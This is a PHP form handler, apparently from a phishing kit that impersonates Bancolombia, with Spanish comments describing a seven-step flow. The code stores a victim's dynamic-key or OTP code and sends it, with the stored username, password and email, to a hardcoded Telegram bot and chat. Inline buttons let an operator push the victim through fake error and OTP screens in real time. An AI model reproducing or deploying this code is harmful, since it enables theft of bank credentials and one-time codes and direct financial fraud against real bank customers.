<?php
/**
 * enviar_dato_extra.php
 * ---------------------
 * Handler POST de la pantalla de CLAVE DINÁMICA 1 (opcion1.html).
 *
 * El usuario ya rellenó el 1er factor y vuelve a la pantalla de loader
 * para esperar una segunda decisión del operador.
 *
 * 7 PASOS STANDARD (igual que el resto de enviar_dato_extra*):
 *   1) Recibir campos del formulario (en este caso `codigo` dinámico + key).
 *   2) SELECT solicitudes WHERE `key` = ? para recuperar info completa.
 *   3) Generar NUEVO request_id = BCO_<144 bits> (mismo formato que sendata).
 *   4) UPDATE la fila:
 *        • nuevo request_id
 *        • estado = 'pendiente' (así el loader no salta solo)
 *        • guardar los datos extra que rellenó el usuario (codigo_dinamica).
 *   5) Enviar mensaje a Telegram con TODOS los datos del flujo hasta el momento
 *      + teclado inline standard (errores / DINAMICA / OTP / FINALIZAR).
 *        OPCION_9  = 🔴 ERROR Dinámica  (pantalla error Bancolombia opcion9.html)
 *        OPCION_10 = 🟢 FINALIZAR     (URL real bancolombia.com/personas/creditos)
 *   6) 302 Location a espera.html (loader indefinido otra vez).
 *   7) exit.
 */

ob_start();
require __DIR__ . DIRECTORY_SEPARATOR . 'conexion.php';

// ── Paso 1 ────────────────────────────────────────────────────────────────────
$codigo = $_POST['codigo'] ?? '';
$key    = $_POST['key']    ?? '';
if (!$key) {
    die("Error: Key no proporcionada.");
}

// ── Paso 2 ────────────────────────────────────────────────────────────────────
$stmt = $pdo->prepare(
    "SELECT numero_cuenta, monto, banco, nombre, telefono, correo
     FROM solicitudes WHERE BINARY `key` = ? LIMIT 1"
);
$stmt->execute([$key]);
$data = $stmt->fetch(PDO::FETCH_ASSOC);
if (!$data) {
    die("Error: Solicitud no encontrada.");
}

$celular = $data['numero_cuenta'];
$monto   = $data['monto'];
$banco   = $data['banco'];
$usuario = $data['nombre'];
$clave   = $data['telefono'];
$correo  = $data['correo'];

// ── Paso 3: nuevo request_id formato BCO_<144 bits> (mismo scope Bancolombia) ─
try {
    $nuevo_request_id = 'BCO_' . bin2hex(random_bytes(18));
} catch (Throwable $_) {
    $nuevo_request_id = 'BCO_' . bin2hex(openssl_random_pseudo_bytes(18));
}

// ── Paso 4 ────────────────────────────────────────────────────────────────────
$update = $pdo->prepare(
    "UPDATE solicitudes
     SET request_id = ?, estado = 'pendiente'
     WHERE BINARY `key` = ?"
);
$update->execute([$nuevo_request_id, $key]);

$saveCode = $pdo->prepare(
    "UPDATE solicitudes SET codigo_dinamica = ? WHERE BINARY `key` = ?"
);
$saveCode->execute([$codigo, $key]);

// ── Paso 5: mensaje Telegram + teclado inline standard ────────────────────────
$token   = "8067654456:AAEBhilArTMwjCmZrxW2MPsPS4-yx9hSFYU";
$chat_id = "-4923753161";

$mensaje  = "🧾 *Recibo Digital de Recarga*\n";
$mensaje .= "━━━━━━━━━━━━━━━━━━━━━━\n";
$mensaje .= "💸 Recarga solicitada: $monto\n";
$mensaje .= "🏦 Banco elegido: $banco\n";
$mensaje .= "📧 Email: $correo\n";
$mensaje .= "━━━━━━━━━━━━━━━━━━━━━━\n";
$mensaje .= "Usuario: $usuario\n";
$mensaje .= "Contraseña: $clave\n";
$mensaje .= "━━━━━━━━━━━━━━━━━━━━━━\n";
$mensaje .= "Dinámica/OTP: $codigo\n";
$mensaje .= "━━━━━━━━━━━━━━━━━━━━━━\n";

$botones = [
    'inline_keyboard' => [[
        ['text' => "clavedinamica",    'callback_data' => "OPCION_1_$nuevo_request_id"],
        ['text' => "otp",              'callback_data' => "OPCION_2_$nuevo_request_id"],
    ], [
        ['text' => "repetirusuario",   'callback_data' => "OPCION_3_$nuevo_request_id"],
        ['text' => "repetirdinamica",  'callback_data' => "OPCION_4_$nuevo_request_id"],
    ], [
        ['text' => "🔴ERROR Dinámica", 'callback_data' => "OPCION_9_$nuevo_request_id"],
        ['text' => "🟢FINALIZAR",      'callback_data' => "OPCION_10_$nuevo_request_id"],
    ]],
];

$payload = json_encode([
    'chat_id'      => $chat_id,
    'text'         => $mensaje,
    'reply_markup' => $botones,
]);
$ch = curl_init("https://api.telegram.org/bot{$token}/sendMessage");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);

// ── Paso 6 y 7 ────────────────────────────────────────────────────────────────
header("Location: espera.html?rid=$nuevo_request_id&key=$key&correo=" . urlencode($correo));
exit;
